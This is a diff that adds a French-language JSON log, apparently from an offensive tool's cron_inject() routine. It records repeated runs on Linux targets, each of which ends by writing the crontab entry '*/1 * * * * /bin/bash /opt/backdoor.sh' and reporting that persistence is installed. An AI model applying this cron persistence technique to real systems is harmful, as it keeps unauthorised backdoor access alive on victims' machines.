@@ -1,0 +1,1458 @@
+[
+    {
+        "timestamp": "Thu Jun 18 17:32:51 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:51 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:51 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:51 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:51 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:51 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:52 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:54 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:54 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:54 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:54 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 17:32:54 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:56 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:57 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:59 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:59 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:59 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:59 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Thu Jun 18 18:26:59 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:19 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:21 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:21 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:21 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:21 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Wed Jul  1 08:47:21 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:46 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:47 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:50 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:50 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:50 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:50 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:44:50 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:53 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:54 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:57 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:57 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:57 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:57 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:48:57 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:04 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:05 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:08 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:08 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:08 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:08 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 14:52:08 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:11 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:12 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:15 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:15 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:15 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:15 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 19:52:15 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:00 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:01 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:03 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:04 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:04 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:04 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Sun Aug  2 20:48:04 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /var"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /run"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /var/run"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /var/spool/cron/crontabs"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:41 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log/cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : mkdir -p /var/log"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/crontab"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : mkdir -p /etc/anacrontab"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /etc/cron.d"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /etc/cron.hourly"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /etc/cron.daily"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /var/run/crond.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /var/run/cron.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /run/crond.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:42 2026",
+        "message": "Exécution de la commande : touch /run/cron.pid"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:44 2026",
+        "message": "✅ Service cron démarré (ou déjà en cours)"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:45 2026",
+        "message": "Création nouvelle crontab"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:45 2026",
+        "message": "Crontab injectée: */1 * * * * /bin/bash /opt/backdoor.sh 2>&1"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:45 2026",
+        "message": "✅ Persistence installée via cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 13:32:45 2026",
+        "message": "Fin cron_inject()"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:21 2026",
+        "message": "OS cible détecté: linux"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Utilisation CRON (Linux)"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Démarrage ou vérification du service cron"
+    },
+    {
+        "timestamp": "Tue Aug  4 15:19:22 2026",
+        "message": "Exécution de la commande : mkdir -p /etc"
+    },
+    {
